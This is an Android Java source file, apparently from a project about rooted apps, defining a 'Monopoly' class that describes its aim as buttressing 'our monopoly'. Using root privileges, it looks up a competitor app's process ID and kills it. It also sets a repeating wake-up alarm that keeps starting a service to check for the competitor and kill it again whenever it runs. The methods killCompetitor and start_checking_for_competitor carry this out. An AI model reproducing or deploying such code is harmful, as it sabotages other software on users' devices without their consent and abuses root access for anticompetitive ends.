package com.trustme.testsu;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.trustme.testsu.root.Root;
import com.trustme.testsu.utils.Constants;
import com.trustme.testsu.utils.HelpFunctions;

/**
 * Monopoly strives to patron and buttress our monopoly.
 * It can perform actions that can aid towards that direction.
 * @author sdemetr2
 *
 */
public class Monopoly {
	public static final String TAG = "Monopoly";
	
	private AlarmManager alarm;
	private PendingIntent pintent;
	
	public Monopoly(){
		
	}
	
	/**
	 * Finds the pid of a competitor</br>
	 * This is unstable. Use killCompetitor Alarm or start_checking_for_competitor service starters</br>
	 * <b>Requires root privileges</b>
	 * @author sdemetr2
	 */
	 public void getCompetitorsPid() {
			// TODO Auto-generated method stub
		 int pid = HelpFunctions.getPidOfPack(Constants.COMPETITOR_PACK);
		 Log.d(TAG, "PID of competitor is: " + pid);
		 Root rt = new Root();
		 rt.kill(pid);
//		 String[] commands = {"kill" + pid};
//		 rt.RunAsRoot(commands);
	}
	 
	 /**
	  * Set alarm for starting a killing service that checks if a competitor's app (pid) is running</br>
	  *  If it does it kills it and the service stops itself</br>
	  *  <b>Requires root privileges</b>
	  * @author sdemetr2
	  */
	 public void killCompetitor() {
			// TODO Auto-generated method stub
		 Intent intent = new Intent(MyApplication.getAppContext(), AreYouRunningService.class);
		 pintent = PendingIntent.getService(MyApplication.getAppContext(), 0, intent, 0);
		 alarm = (AlarmManager)MyApplication.getAppContext().getSystemService(Context.ALARM_SERVICE);
		 alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Constants.KILL_COMPETITOR_INTERVAL, pintent);
	 }
	 
	 /**
	  * stop killing competitor. It cancels the alarm that keeps on starting the</br>
	  * 	killing service
	  * @author sdemetr2
	  */
	 public void stopkillingCompetitor() {
			// TODO Auto-generated method stub
		 alarm.cancel(pintent);
	 }
	 
	 /**
	  * This will start a killing service that checks whether the competitors app (pid) is running</br>
	  * 	If it does it KILLS it and stops itself </br>
	  * <b>Requires root privileges</b>
	  * @author sdemetr2
	  */
	 public void start_checking_for_competitor() {
			// TODO Auto-generated method stub
		 Log.i(TAG, "start service AreYouRunning");
			Intent intent = new Intent(MyApplication.getAppContext(), AreYouRunningService.class);
			MyApplication.getAppContext().startService(intent);
		}
	 
	 /**
	  * This will stop the killing service that searches for a competitors PID
	  * 	Be careful not to call it without such a service present.
	  * @author sdemetr2 
	  */
	 public void stop_checking_for_competitor() {
			// TODO Auto-generated method stub
		 Intent intent = new Intent(MyApplication.getAppContext(), AreYouRunningService.class);
		 MyApplication.getAppContext().stopService(intent);
		}

}
